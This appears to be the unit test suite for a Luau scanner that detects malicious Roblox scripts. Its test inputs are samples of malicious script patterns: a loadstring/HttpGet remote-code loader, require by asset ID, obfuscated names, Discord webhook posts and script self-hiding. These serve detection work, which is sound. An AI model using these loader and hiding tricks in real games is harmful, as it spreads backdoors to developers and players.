-- Unit tests for the pure Luau core. Run: lune run tests/unit.luau
local Lexer = require("../src/Core/Lexer")
local Analyzer = require("../src/Core/Analyzer")
local TreeScan = require("../src/Core/TreeScan")
local Report = require("../src/Core/Report")
local Rules = require("../src/Core/Rules")

local passed, failed = 0, 0
local function test(name: string, fn: () -> ())
	local ok, err = pcall(fn)
	if ok then
		passed += 1
	else
		failed += 1
		print("FAIL " .. name .. "\n     " .. tostring(err))
	end
end
local function eq(a, b, msg: string?)
	if a ~= b then
		error((msg or "") .. " expected " .. tostring(b) .. ", got " .. tostring(a), 2)
	end
end
local function rules(src: string): { [string]: number }
	local m = {}
	for _, f in Analyzer.analyze(src) do
		m[f.rule] = (m[f.rule] or 0) + 1
	end
	return m
end
local function has(src: string, rule: string)
	local r = rules(src)
	if not r[rule] then
		local got = {}
		for k in r do
			table.insert(got, k)
		end
		error("expected rule " .. rule .. ", got {" .. table.concat(got, ",") .. "}", 2)
	end
end
local function none(src: string)
	local r = rules(src)
	local got = {}
	for k in r do
		table.insert(got, k)
	end
	if #got > 0 then
		error("expected no findings, got {" .. table.concat(got, ",") .. "}", 2)
	end
end

-- Lexer
test("lexer keeps length and blanks strings and comments", function()
	local src = 'local a = "loadstring(x)" -- getfenv()\nprint([[require(1)]]) --[==[ setfenv ]==] b()'
	local lx = Lexer.lex(src)
	eq(#lx.code, #src, "length")
	eq(string.find(lx.code, "loadstring", 1, true), nil, "string blanked")
	eq(string.find(lx.code, "getfenv", 1, true), nil, "comment blanked")
	eq(string.find(lx.code, "require", 1, true), nil, "long string blanked")
	eq(string.find(lx.code, "setfenv", 1, true), nil, "long comment blanked")
	eq(#lx.strings, 2)
	eq(lx.strings[2].value, "require(1)")
	assert(string.find(lx.code, "b()", 1, true), "code after long comment kept")
end)
test("lexer decodes escapes", function()
	local v, n = Lexer.decode("\\114\\101\\x71u\\105re\\n")
	eq(v, "require\n")
	eq(n, 5)
end)
test("lexer handles escaped quotes and unfinished strings", function()
	local lx = Lexer.lex('local s = "a\\"b" x()\nlocal t = "oops\nrequire(5)')
	eq(lx.strings[1].value, 'a"b')
	assert(string.find(lx.code, "require(5)", 1, true), "code after unfinished string is still code")
end)
test("lineOf maps positions to lines", function()
	local lx = Lexer.lex("a\nbb\nccc")
	eq(Lexer.lineOf(lx, 1), 1)
	eq(Lexer.lineOf(lx, 3), 2)
	eq(Lexer.lineOf(lx, 6), 3)
end)

-- Clean code
test("ordinary module code has no findings", function()
	none([[
local Players = game:GetService("Players")
local Shared = require(script.Parent.Shared)
local Util = require(game.ReplicatedStorage:WaitForChild("Util"))
local store = game:GetService("DataStoreService"):GetDataStore("Coins")
-- never use loadstring or getfenv here
local label = "require(123) is just text"
Players.PlayerAdded:Connect(function(p)
	local coins = store:GetAsync(p.UserId) or 0
	print(p.Name, coins, string.format("%d", 1000000))
end)
return {}
]])
end)
test("Rules file style strings do not trigger", function()
	none('local names = { "require", "loadstring", "getfenv", "LuaVM", "IronBrew" }')
end)

-- Remote require
test("require with an asset ID", function()
	has("require(4823934823)", "remote-require")
	has("require( (12345678) )", "remote-require")
	has("local m = require(0x1F2E3D4C)", "remote-require")
	has("require(123*1).load()", "remote-require")
end)
test("require through a variable or string", function()
	has("local id = 74839291\nlocal m = require(id)", "remote-require-hidden")
	has('require("74839291")', "remote-require-hidden")
	has('require(tonumber("748" .. "39291"))', "remote-require-hidden")
end)
test("require of a variable name with digits is not an asset ID", function()
	none("local mod1 = script.Parent.A\nlocal x = require(mod1)")
end)
test("finding has the correct line and snippet", function()
	local fs = Analyzer.analyze("print(1)\nprint(2)\n    require(99999999):Fire()\n")
	eq(fs[1].rule, "remote-require")
	eq(fs[1].line, 3)
	eq(fs[1].snippet, "require(99999999):Fire()")
	eq(fs[1].severity, "critical")
	eq(fs[1].store, true)
end)

-- Banned functions
test("loadstring, fenv, LoadAsset, GetObjects, LinkedSource", function()
	has('loadstring(game:HttpGet("http://x"))()', "loadstring")
	has("local env = getfenv(0)", "fenv")
	has("setfenv(1, {})", "fenv")
	has("getrenv().x = 1", "fenv")
	has('game:GetService("InsertService"):LoadAsset(1234)', "load-asset")
	has("InsertService:LoadAssetVersion(1)", "load-asset")
	has('game:GetObjects("rbxassetid://1")', "load-asset")
	has("s.LinkedSource = x", "linked-source")
end)
test("names inside identifiers are not matched", function()
	none("local v = node.LinkedSource\nif s.LinkedSource == '' then end")
	none('local pattern = "discord.com/api/webhooks"')
	none("local myloadstringHelper = 1\nlocal getfenvironment = 2\nlocal requireAll = 3")
end)

-- Hidden names
test("reversed names", function()
	has('local f = getfenv()[("gnirtsdaol"):reverse()]', "hidden-name")
	has('local r = string.reverse("eriuqer")', "hidden-name")
end)
test("joined names", function()
	has('local f = _G["re" .. "quire"]', "hidden-name")
	has("local f = env['load'..'str'..'ing']", "hidden-name")
	none('local s = "hello " .. "world"')
end)
test("escaped names and escape blobs", function()
	has('local n = "\\114\\101\\113\\117\\105\\114\\101"', "hidden-name")
	has('local n = "\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\41"', "escape-obfuscation")
	has('local n = "lo\\97dstring"', "hidden-name")
	none('print("line1\\nline2\\tok")')
end)
test("string.char", function()
	has("local n = string.char(114,101,113,117,105,114,101)", "hidden-name")
	has("local n = string.char(72,101,108,108,111,32,87)", "string-char")
	none("local c = string.char(65)")
end)

-- Obfuscators and layout
test("obfuscator marker in a comment, not in a string", function()
	has("-- This file was protected using Luraph Obfuscator v14\nreturn(function(...) end)(...)", "obfuscator-signature")
	has("LPH_JIT(function() end)", "obfuscator-signature")
	none('local list = { "Luraph Obfuscator", "MoonSec" }')
end)
test("code hidden behind spaces", function()
	has('print("hello")' .. string.rep(" ", 300) .. "require(1234567)()", "hidden-code")
	local fs = Analyzer.analyze('print("hello")' .. string.rep(" ", 300) .. "require(1234567)()")
	eq(fs[1].snippet, 'print("hello")  [300 spaces]  require(1234567)()')
	none("local x = 1" .. string.rep(" ", 20) .. "-- aligned comment")
end)
test("long line, long encoded string, large script", function()
	has("local t = {" .. string.rep("1,", 1200) .. "}", "long-line")
	has('local b = "' .. string.rep("QUJD", 600) .. '"', "long-string")
	local big = string.rep("local x = 1\n", 20000)
	has(big, "large-script")
end)

-- Risky behaviour
test("webhook, purchase prompt, teleport, self-hide, user id, http", function()
	has('Http:PostAsync("https://discord.com/api/webhooks/1/abc", data)', "webhook")
	has("MarketplaceService:PromptGamePassPurchase(plr, 123)", "purchase-prompt")
	has("TeleportService:Teleport(1234567, plr)", "teleport")
	has("script.Parent = nil", "self-hide")
	has('script.Name = "Weld"', "self-hide")
	has("if plr.UserId == 12345678 then admin(plr) end", "hardcoded-user")
	has("if 12345678 == player.UserId then end", "hardcoded-user")
	has("HttpService:GetAsync(url)", "http")
	none("local script = Instance.new('Script')\nscript.Name = 'Main'")
	none("local v = store:GetAsync(key)\nif script.Name == 'A' then end\nTeleportService:Teleport(placeId, plr)")
end)

test("findings are sorted by severity", function()
	local fs = Analyzer.analyze("script.Parent = nil\nrequire(1234567)\nHttpService:PostAsync(u, d)")
	eq(fs[1].severity, "critical")
	eq(fs[#fs].severity, "low")
end)
test("every rule id used in findings exists", function()
	for _, r in Rules.list do
		assert(Rules.byId[r.id] == r)
		assert(Rules.rank[r.severity], r.id)
	end
end)

-- Tree scan on plain tables
local function S(name, cls, src, kids)
	return { Name = name, ClassName = cls, Source = src, children = kids }
end
local function F(name, cls, kids)
	return { Name = name, ClassName = cls, children = kids }
end

test("tree scan finds virus names, odd parents and duplicates", function()
	local spread = "script.Parent = nil\nfor _, v in workspace:GetDescendants() do end -- copies itself"
	local kids = {}
	for i = 1, 6 do
		table.insert(kids, F("Brick" .. i, "Part", { S("Spread", "Script", spread) }))
	end
	table.insert(kids, F("Weld", "Weld", { S("Helper", "Script", "print('hi')") }))
	table.insert(kids, S("Fine", "ModuleScript", "return {}"))
	local rep = TreeScan.scan({ F("Model", "Model", kids) }, TreeScan.TableAdapter)
	eq(rep.scripts, 8)
	local byRule = {}
	for _, e in rep.results do
		for _, f in e.findings do
			byRule[f.rule] = (byRule[f.rule] or 0) + 1
		end
	end
	eq(byRule["virus-name"], 6)
	eq(byRule["duplicate-script"], 6)
	eq(byRule["odd-parent"], 1)
	eq(rep.verdict, "suspicious")
	eq(rep.results[1].path, "Model.Brick1.Spread")
end)
test("tree scan store mode, ignore list and LinkedSource", function()
	local tree = F("Kit", "Model", {
		S("Loader", "Script", "require(987654321)"),
		S("Prompt", "Script", "MarketplaceService:PromptPurchase(p, 1)"),
		{ Name = "Linked", ClassName = "ModuleScript", Source = "", LinkedSource = "rbxassetid://55" },
	})
	local full = TreeScan.scan({ tree }, TreeScan.TableAdapter)
	eq(full.verdict, "unsafe")
	local store = TreeScan.scan({ tree }, TreeScan.TableAdapter, { storeOnly = true })
	eq(store.verdict, "blocked")
	eq(store.storeIssues, 2)
	eq(#store.results, 2, "purchase prompt is not a store rule")
	local ign = TreeScan.scan({ tree }, TreeScan.TableAdapter, {
		storeOnly = true,
		ignore = { ["Kit.Loader|remote-require"] = true, ["Kit.Linked|linked-source"] = true },
	})
	eq(ign.verdict, "ready")
end)
test("tree scan yields and respects maxNodes", function()
	local kids = {}
	for i = 1, 450 do
		table.insert(kids, F("P" .. i, "Part"))
	end
	local yields = 0
	local rep = TreeScan.scan({ F("M", "Model", kids) }, TreeScan.TableAdapter, { yield = function() yields += 1 end })
	eq(rep.nodes, 451)
	eq(yields, 2)
	local cut = TreeScan.scan({ F("M", "Model", kids) }, TreeScan.TableAdapter, { maxNodes = 10 })
	eq(cut.truncated, true)
	eq(cut.verdict, "clean")
end)

-- Report
test("report text and csv", function()
	local tree = F("Kit", "Model", { S("Bad,Name", "Script", 'require(12345678)\nlocal a = "=cmd"') })
	local rep = TreeScan.scan({ tree }, TreeScan.TableAdapter)
	local txt = Report.toText(rep)
	assert(string.find(txt, "Dangerous code found. 1 scripts checked, 1 critical", 1, true), txt)
	assert(string.find(txt, "[CRITICAL] Loads code by asset ID", 1, true), txt)
	local csv = Report.toCsv(rep)
	assert(string.find(csv, '"Kit.Bad,Name",Script,critical,remote-require,yes,1,require(12345678)', 1, true), csv)
	local store = TreeScan.scan({ tree }, TreeScan.TableAdapter, { storeOnly = true })
	assert(string.find(Report.summary(store), "1 issues break the Creator Store asset rules", 1, true))
end)
test("csv guards spreadsheet formulas", function()
	local rep = {
		results = { { path = "=HYPERLINK(1)", className = "Script", findings = { { severity = "low", rule = "http", store = false, line = 1, detail = "+x" } } } },
	}
	local csv = Report.toCsv(rep)
	assert(string.find(csv, "'=HYPERLINK(1),Script,low,http,no,1,'+x", 1, true), csv)
end)

-- Regression tests from the independent review
test("review 1, code inside interpolated strings is code", function()
	has("print(`{require(1234567)}`)", "remote-require")
	has("local x = `a {loadstring(s)()} b`", "loadstring")
	has('local a = `{[[`]]}`\nrequire(1234567)', "remote-require")
	has('print(`{"`"}`) require(1234567)', "remote-require")
	none("local msg = `Hello {player.Name}, you have {coins} coins and {#items} items`")
	none("local s = `require(1234567) is text here`")
	local lx = Lexer.lex("local t = `x {f({a = 1})} y`")
	eq(#lx.code, #"local t = `x {f({a = 1})} y`")
end)
test("review 11, backslash before CRLF continues the string", function()
	has('local s = "a\\\r\nb" require(1234567)', "remote-require")
end)
test("review 4, require evasions", function()
	has("local id: number = 1234567\nrequire(id)", "remote-require-hidden")
	has("id = 1234567\nrequire(id)", "remote-require-hidden")
	has("local r = require; r(1234567)", "remote-require-hidden")
	has("local r = require\nr(1234567)", "remote-require-hidden")
	has("local ids = {1234567}\nrequire(ids[1])", "remote-require-hidden")
	none("local Mods = script.Parent:GetChildren()\nlocal m = require(Mods[1])")
	none("local x = require(script.Parent.A)\nlocal y = require(game.ReplicatedStorage.B)")
end)
test("review 8, local script = script still counts as the running script", function()
	has("local script = script\nscript.Parent = nil", "self-hide")
end)
test("review 9, emoji escapes and http receivers", function()
	none('print("\\240\\159\\152\\128\\240\\159\\152\\128\\240\\159\\152\\128")')
	none("local HttpThing = 1\nlocal v = store:GetAsync(k)")
	has('local HS = game:GetService("HttpService")\nHS:GetAsync(url)', "http")
	has('game:GetService("HttpService"):PostAsync(url, body)', "http")
end)
test("review 2 and 3, long chains and many constants stay fast", function()
	local os_clock = os.clock
	local parts = table.create(20000, '"ab"')
	local t0 = os_clock()
	Analyzer.analyze("local s = " .. table.concat(parts, "..") .. "\n")
	local t1 = os_clock() - t0
	assert(t1 < 2, "20k piece chain took " .. t1 .. " s")
	local lines = {}
	for i = 1, 8000 do
		table.insert(lines, "local c" .. i .. " = " .. (1000000 + i))
	end
	t0 = os_clock()
	Analyzer.analyze(table.concat(lines, "\n"))
	local t2 = os_clock() - t0
	assert(t2 < 2, "8000 constants took " .. t2 .. " s")
	print(string.format("  perf: 20k-piece chain %.2f s, 8000 constants %.2f s", t1, t2))
end)

print(string.format("unit: %d passed, %d failed", passed, failed))
if failed > 0 then
	local process = require("@lune/process")
	process.exit(1)
end
